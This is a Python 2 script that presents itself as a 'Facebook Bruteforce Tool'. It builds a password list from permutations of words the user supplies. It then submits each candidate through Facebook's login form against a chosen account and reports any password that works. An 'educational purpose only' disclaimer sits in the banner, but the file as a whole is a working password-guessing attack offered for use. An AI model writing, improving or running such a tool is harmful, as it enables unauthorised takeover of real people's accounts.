import itertools
import mechanize
import pdb
import sys
import cookielib
import random

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

banner = '''

	##############################################################
	#                                                            #
	#	Author:Saivinay.manapuram                            #
        #       Facebook Bruteforce Tool with permutation of words   #
	#	Author:Saivinay.manapuram                            #
	#	email:saivinay.manapuram@gmail.com                   #
	#	facebook:www.facebook.com/saivinay1995               #
	#                                                            #
	#	Note:this tool is for educational purpose only       #
     	#	i am not responsible for any misuse		     #			       
	#                                                            #   
	##############################################################

'''




data = []
lists = []
print bcolors.OKBLUE + banner
n = int(raw_input('Enter no of words for combinations: '))
for i in range(0, n):
    x = raw_input('Enter the elements into the array: ')
    data.append(x)
chars = "".join(data)
for i in range(1, len(chars) + 1):
    for p in itertools.permutations(data, len(data)):
	lists.append("".join(p))
        

passwordlist = open("words.txt",'w')
for item in lists:
	passwordlist.write(str(item) + "\n")

email = str(raw_input("# Enter |Email| |Phone number| |Profile ID number| |Username| : "))
passwordlist = str(raw_input("Enter the name of the password list file : "))

useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]



login = 'https://www.facebook.com/login.php?login_attempt=1&amp;lwv=110'
try:
	br = mechanize.Browser()
    	cj = cookielib.LWPCookieJar()
    	br.set_handle_robots(False)
    	br.set_handle_equiv(True)
    	br.set_handle_referer(True)
    	br.set_handle_redirect(True)
    	br.set_cookiejar(cj)
    	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
except KeyboardInterrupt:
	print "\n[*] Exiting program ..\n"
    	sys.exit(1)

def attack(password):
	try:
		sys.stdout.write("\r[*] trying %s.. " % password)
		sys.stdout.flush()
		br.addheaders = [('User-agent', random.choice(useragents))]
		site = br.open(login)
        	br.select_form(nr=0)
        	br.form['email'] =email
        	br.form['pass'] = password
        	br.submit()
        	log = br.geturl()
        	if (log != login) and (not 'login_attempt' in log):
        		pdb.set_trace()
        		print "\n\n\n [*] Password found .. !!"
        		print "\n [*] Password :",password
        		sys.exit(1)
    	except KeyboardInterrupt:
        	print "\n[*] Exiting program .. "
        	sys.exit(1)


files = open("words.txt",'r')
passwords = files.readlines()

print " [*] Account to crack : %s" % (email)
print " [*] Loaded :" , len(passwords), "passwords"
print " [*] Cracking, please wait ..."
for pas in passwords:
	attack(pas)
